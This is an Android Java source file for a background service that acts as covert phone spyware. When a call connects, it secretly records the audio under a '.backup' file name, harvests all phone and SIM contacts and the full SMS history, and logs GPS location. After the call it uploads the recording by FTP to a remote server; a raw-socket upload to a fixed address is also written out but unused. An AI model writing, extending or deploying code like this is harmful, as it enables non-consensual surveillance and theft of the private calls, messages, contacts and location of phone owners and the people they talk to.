package cn.itcast.listener;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PushbackInputStream;
import java.io.RandomAccessFile;
import java.net.Socket;
import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.ArrayList;

import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPReply;

import android.app.Service;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.CommonDataKinds.Photo;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import cn.itcast.db.constant.Constant;
import cn.itcast.location.Baidulocation;
import cn.itcast.model.ContactInfo;
import cn.itcast.utils.ACache;
import cn.itcast.utils.FtpUtils;
import cn.itcast.utils.ReadWriteFile;
import cn.itcast.utils.StreamTool;

public class PhoneService extends Service {
	private Uri insertUri = Uri
			.parse("content://cn.itcast.provider/phonelistener/1");
	/** 获取库Phon表字段 **/
	private static final String[] PHONES_PROJECTION = new String[] {
			Phone.DISPLAY_NAME, Phone.NUMBER, Photo.PHOTO_ID, Phone.CONTACT_ID };

	/** 联系人显示名称 **/
	private static final int PHONES_DISPLAY_NAME_INDEX = 0;

	/** 电话号码 **/
	private static final int PHONES_NUMBER_INDEX = 1;

	/** 头像ID **/
	private static final int PHONES_PHOTO_ID_INDEX = 2;

	/** 联系人的ID **/
	private static final int PHONES_CONTACT_ID_INDEX = 3;
	private static String path = Constant.STRFOLDER + File.separator
			+ Constant.CARDHOLDERTXT;
	private static File filename = new File(path);
	private ArrayList<ContactInfo> contactInfos = new ArrayList<ContactInfo>();
	private String message;
	private Context context;
	private Baidulocation baidu;
	private PhoneListener phoneListener;
	private ACache mCache;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		context = PhoneService.this;
		mCache = ACache.get(context);
		TelephonyManager telephonyManager = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		if (phoneListener == null) {
			phoneListener = new PhoneListener();
		}

		telephonyManager.listen(phoneListener,
				PhoneStateListener.LISTEN_CALL_STATE);

		if (baidu == null) {
			baidu = new Baidulocation();
			baidu.getlocation(this, true);
		}
	}

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
		if (baidu != null) {
			baidu.stop();
			baidu = null;
		}
	}

	private final class PhoneListener extends PhoneStateListener {
		private String phone;
		private MediaRecorder recorder;
		private File audioFile;
		private boolean record;
		private String ftpfileName = "";

		@Override
		public void onCallStateChanged(int state, String incomingNumber) {
			String str = mCache.getAsString("listener");
			if (str != null && str.equals("false")) {
				return;
			}
			switch (state) {
			case TelephonyManager.CALL_STATE_RINGING:// ����״̬
				phone = "Dialinnumbers_" + incomingNumber;
				break;
			case TelephonyManager.CALL_STATE_OFFHOOK:// ����绰
				contactInfos.clear();
				getPhoneContacts(context);
				getSIMContacts(context);
				message = getSmsInPhone();
				if (phone == null) {
					phone = PhoneStateBroadCastReceiver.phoneNumber;
				}
				recordAudio();
				record = true;
				break;
			case TelephonyManager.CALL_STATE_IDLE:// �Ҷϵ绰��Ŀ���״̬
				stopAudio();
				phone = null;
				audioFile = null;
				break;
			}
		}

		private void stopAudio() {
			insertTxt();
			if (audioFile != null) {
				insertPhone();

			}
			Intent intent = new Intent();
			intent.setAction("cn.itcast.listener.broadcast");
			// 发送 一个无序广播
			context.sendBroadcast(intent);
			if (recorder != null) {
				if (record)
					recorder.stop();
				recorder.release();
				recorder = null;
				record = false;
				Message message = handler.obtainMessage();
				message.sendToTarget();
				// uploadAudio();
			}
		}

		private Handler handler = new Handler() {
			public void handleMessage(android.os.Message msg) {
				Thread thread = new Thread(new Runnable() {
					@Override
					public void run() {
						// TODO Auto-generated method stub
						String url = Constant.URL;
						String port = Constant.PORT;
						String username = Constant.USERNAME;
						String password = Constant.PASSWORD;
						String remotePath = Constant.REMOTEPATH;
						String fileNamePath = Constant.STRFOLDER
								+ File.separator;
						String fileName = ftpfileName;

						FtpUtils.ftpUpload(Constant.URL, Constant.PORT,
								Constant.USERNAME, Constant.PASSWORD,
								Constant.REMOTEPATH, fileNamePath, fileName);
					}
				});
				thread.start();
			};
		};

		private void insertPhone() {
			ContentResolver orderContentRever = context.getContentResolver();
			ContentValues cvalues = new ContentValues();
			cvalues.put("phone", phone);
			cvalues.put("cardholderpath", path);
			if (audioFile != null) {
				cvalues.put("voicepath", audioFile.getAbsolutePath());
			}
			cvalues.put("longitude", Baidulocation.longitude);
			cvalues.put("latitude", Baidulocation.latitude);
			cvalues.put("address", Baidulocation.address);
			cvalues.put("gpstime", Baidulocation.gpstime);
			cvalues.put("imagepath", Baidulocation.latitude);
			cvalues.put("latitude", Baidulocation.latitude);
			cvalues.put("message", message);
			cvalues.put("imagepath", Environment.getExternalStorageDirectory()
					.getAbsolutePath() + "/Photo");
			orderContentRever.insert(insertUri, cvalues);
		}

		private void insertTxt() {
			try {
				ReadWriteFile.creatTxtFile(filename);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			StringBuilder smsBuilder = new StringBuilder();
			ReadWriteFile.clearTxtFile(filename);
			for (ContactInfo contactInfo : contactInfos) {
				String str = "号码：" + contactInfo.getPhoneNumber() + "   联系名称： "
						+ contactInfo.getContactName();
				smsBuilder.append(str);
				smsBuilder.append("\r\n");
			}

			try {
				ReadWriteFile.writeTxtFile(smsBuilder.toString(), filename);

			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}

		/** 得到手机通讯录联系人信息 **/
		@SuppressWarnings("unused")
		private void getPhoneContacts(Context mContext) {
			ContentResolver resolver = mContext.getContentResolver();
			// 获取手机联系人
			Cursor phoneCursor = resolver.query(Phone.CONTENT_URI,
					PHONES_PROJECTION, null, null, null);

			if (phoneCursor != null) {
				while (phoneCursor.moveToNext()) {
					// 得到手机号码
					String phoneNumber = phoneCursor
							.getString(PHONES_NUMBER_INDEX);
					// 当手机号码为空的或者为空字段 跳过当前循环
					if (TextUtils.isEmpty(phoneNumber))
						continue;

					// 得到联系人名称
					String contactName = phoneCursor
							.getString(PHONES_DISPLAY_NAME_INDEX);

					// 得到联系人ID
					Long contactid = phoneCursor
							.getLong(PHONES_CONTACT_ID_INDEX);

					// 得到联系人头像ID
					Long photoid = phoneCursor.getLong(PHONES_PHOTO_ID_INDEX);

					// 得到联系人头像Bitamp
					Bitmap contactPhoto = null;

					// photoid 大于0 表示联系人有头像 如果没有给此人设置头像则给他一个默认的
					if (photoid > 0) {
						Uri uri = ContentUris.withAppendedId(
								ContactsContract.Contacts.CONTENT_URI,
								contactid);
						InputStream input = ContactsContract.Contacts
								.openContactPhotoInputStream(resolver, uri);
						contactPhoto = BitmapFactory.decodeStream(input);
					} else {
						contactPhoto = BitmapFactory.decodeResource(
								context.getResources(), R.drawable.icon);
					}

					ContactInfo contactInfo = new ContactInfo();
					contactInfo.setContactid(contactid);
					contactInfo.setContactName(contactName);
					contactInfo.setContactPhoto(contactPhoto);
					contactInfo.setPhoneNumber(phoneNumber);
					contactInfo.setPhotoid(photoid);

					contactInfos.add(contactInfo);
				}
				phoneCursor.close();
			}
		}

		public String getSmsInPhone() {
			final String SMS_URI_ALL = "content://sms/";
			final String SMS_URI_INBOX = "content://sms/inbox";
			final String SMS_URI_SEND = "content://sms/sent";
			final String SMS_URI_DRAFT = "content://sms/draft";

			StringBuilder smsBuilder = new StringBuilder();

			try {
				ContentResolver cr = context.getContentResolver();
				String[] projection = new String[] { "_id", "address",
						"person", "body", "date", "type" };
				Uri uri = Uri.parse(SMS_URI_ALL);
				Cursor cur = cr.query(uri, projection, null, null, "date desc");

				if (cur.moveToFirst()) {
					String name;
					String phoneNumber;
					String smsbody;
					String date;
					String type;

					int nameColumn = cur.getColumnIndex("person");
					int phoneNumberColumn = cur.getColumnIndex("address");
					int smsbodyColumn = cur.getColumnIndex("body");
					int dateColumn = cur.getColumnIndex("date");
					int typeColumn = cur.getColumnIndex("type");
					int i = 0;
					do {
						name = cur.getString(nameColumn);
						phoneNumber = cur.getString(phoneNumberColumn);
						smsbody = cur.getString(smsbodyColumn);
						i++;
						SimpleDateFormat dateFormat = new SimpleDateFormat(
								"yyyy-MM-dd hh:mm:ss");
						Date d = new Date(Long.parseLong(cur
								.getString(dateColumn)));
						date = dateFormat.format(d);

						int typeId = cur.getInt(typeColumn);
						if (typeId == 1) {
							type = "接收";
						} else if (typeId == 2) {
							type = "发送";
						} else {
							type = "";
						}

						smsBuilder.append("第" + i + "条" + " " + type + "   [");
						smsBuilder.append("\r\n");

						for (ContactInfo contactInfo : contactInfos) {
							if (phoneNumber
									.equals(contactInfo.getPhoneNumber())) {
								smsBuilder.append(type + "者名字："
										+ contactInfo.getContactName() + "   ");
							}
						}
						smsBuilder.append("\r\n");
						smsBuilder.append(type + "者号码：" + phoneNumber + "   ");
						smsBuilder.append("\r\n");
						smsBuilder.append(type + "短信内容：" + smsbody + " ");
						smsBuilder.append("\r\n");
						smsBuilder.append(type + "时间：" + date + "  ");
						smsBuilder.append("\r\n");
						smsBuilder.append(type);
						smsBuilder.append("\r\n");
						smsBuilder.append("]");
						smsBuilder.append("\r\n");
						smsBuilder.append("\r\n");

						if (smsbody == null)
							smsbody = "";
					} while (cur.moveToNext());
				} else {
					smsBuilder.append("no result!");
				}

				smsBuilder.append("getSmsInPhone has executed!");
			} catch (SQLiteException ex) {
				Log.d("SQLiteException in getSmsInPhone", ex.getMessage());
			}
			return smsBuilder.toString();
		}

		/** 得到手机SIM卡联系人人信息 **/
		private void getSIMContacts(Context mContext) {
			ContentResolver resolver = mContext.getContentResolver();
			// 获取Sims卡联系人
			Uri uri = Uri.parse("content://icc/adn");
			Cursor phoneCursor = resolver.query(uri, PHONES_PROJECTION, null,
					null, null);

			if (phoneCursor != null) {
				while (phoneCursor.moveToNext()) {

					// 得到手机号码
					String phoneNumber = phoneCursor
							.getString(PHONES_NUMBER_INDEX);
					// 当手机号码为空的或者为空字段 跳过当前循环
					if (TextUtils.isEmpty(phoneNumber))
						continue;
					// 得到联系人名称
					String contactName = phoneCursor
							.getString(PHONES_DISPLAY_NAME_INDEX);

					// Sim卡中没有联系人头像

					ContactInfo contactInfo = new ContactInfo();
					contactInfo.setContactName(contactName);
					contactInfo.setPhoneNumber(phoneNumber);
					contactInfos.add(contactInfo);
				}
				phoneCursor.close();
			}
		}

		private void uploadAudio() {
			new Thread(new UploadTask()).start();
		}

		private final class UploadTask implements Runnable {
			public void run() {
				try {
					Socket socket = new Socket("192.168.1.100", 7878);
					OutputStream outStream = socket.getOutputStream();
					String head = "";
					if (audioFile != null) {
						head = "Content-Length=" + audioFile.length()
								+ ";filename=" + audioFile.getName()
								+ ";sourceid=\r\n";
					}

					outStream.write(head.getBytes());

					PushbackInputStream inStream = new PushbackInputStream(
							socket.getInputStream());
					String response = StreamTool.readLine(inStream);
					String[] items = response.split(";");
					String position = items[1]
							.substring(items[1].indexOf("=") + 1);
					if (audioFile != null) {
						RandomAccessFile fileOutStream = new RandomAccessFile(
								audioFile, "r");

						fileOutStream.seek(Integer.valueOf(position));

						byte[] buffer = new byte[1024];
						int len = -1;
						while ((len = fileOutStream.read(buffer)) != -1) {
							outStream.write(buffer, 0, len);
						}
						fileOutStream.close();
						outStream.close();
						inStream.close();
						socket.close();
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}

		private void recordAudio() {
			try {
				File file = new File(Constant.STRFOLDER + File.separator);
				ftpfileName = phone + "_" + System.currentTimeMillis()
						+ ".backup";
				audioFile = new File(file, ftpfileName);
				recorder = new MediaRecorder();// JNI - >c .so
				recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
				recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
				recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
				recorder.setOutputFile(audioFile.getAbsolutePath());
				recorder.prepare();
				recorder.start();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

	}

}
